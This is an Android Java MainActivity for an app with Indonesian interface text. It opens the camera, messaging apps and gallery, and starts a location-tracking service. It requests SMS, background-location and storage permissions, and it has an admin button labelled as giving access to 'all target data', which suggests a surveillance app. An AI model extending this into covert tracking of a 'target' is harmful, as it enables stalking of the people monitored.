package com.nexa.nusantara;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.View;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashOn = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) { e.printStackTrace(); }

        CardView cardFrontCam = findViewById(R.id.cardFrontCam);
        CardView cardBackCam = findViewById(R.id.cardBackCam);
        CardView cardWhatsApp = findViewById(R.id.cardWhatsApp);
        CardView cardGallery = findViewById(R.id.cardGallery);
        CardView cardSMS = findViewById(R.id.cardSMS);
        CardView cardGmail = findViewById(R.id.cardGmail);
        CardView cardFlash = findViewById(R.id.cardFlash);
        CardView cardLocation = findViewById(R.id.cardLocation);

        cardFrontCam.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openCamera(true); });
        cardBackCam.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openCamera(false); });
        cardWhatsApp.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openApp("com.whatsapp"); });
        cardGallery.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openGallery(); });
        cardSMS.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openSMS(); });
        cardGmail.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); openApp("com.google.android.gm"); });
        cardFlash.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); toggleFlash(); });
        cardLocation.setOnClickListener(v -> { v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale)); startLocationService(); });

        if (BuildConfig.IS_ADMIN) {
            Button btnAdmin = findViewById(R.id.btnAdmin);
            btnAdmin.setVisibility(View.VISIBLE);
            btnAdmin.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                Toast.makeText(this, "Admin Panel: Akses semua data target", Toast.LENGTH_LONG).show();
            });
        }

        checkPermissions();
    }

    private void checkPermissions() {
        String[] perms = {
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.INTERNET
        };
        List<String> list = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                list.add(p);
        }
        if (!list.isEmpty()) {
            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), 123);
        }
    }

    private void openCamera(boolean front) {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (intent.resolveActivity(getPackageManager()) != null) {
            startActivity(intent);
        } else {
            Toast.makeText(this, "Kamera tidak tersedia", Toast.LENGTH_SHORT).show();
        }
    }

    private void openApp(String pkg) {
        Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
        if (intent != null) startActivity(intent);
        else Toast.makeText(this, "Aplikasi tidak terinstal", Toast.LENGTH_SHORT).show();
    }

    private void openGallery() {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivity(intent);
    }

    private void openSMS() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:"));
        startActivity(intent);
    }

    private void toggleFlash() {
        try {
            if (cameraId != null) {
                isFlashOn = !isFlashOn;
                cameraManager.setTorchMode(cameraId, isFlashOn);
                Toast.makeText(this, isFlashOn ? "Senter ON" : "Senter OFF", Toast.LENGTH_SHORT).show();
            }
        } catch (CameraAccessException e) {
            Toast.makeText(this, "Gagal akses senter", Toast.LENGTH_SHORT).show();
        }
    }

    private void startLocationService() {
        Intent intent = new Intent(this, LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(intent);
        else
            startService(intent);
        Toast.makeText(this, "Tracking lokasi dimulai", Toast.LENGTH_SHORT).show();
    }
}
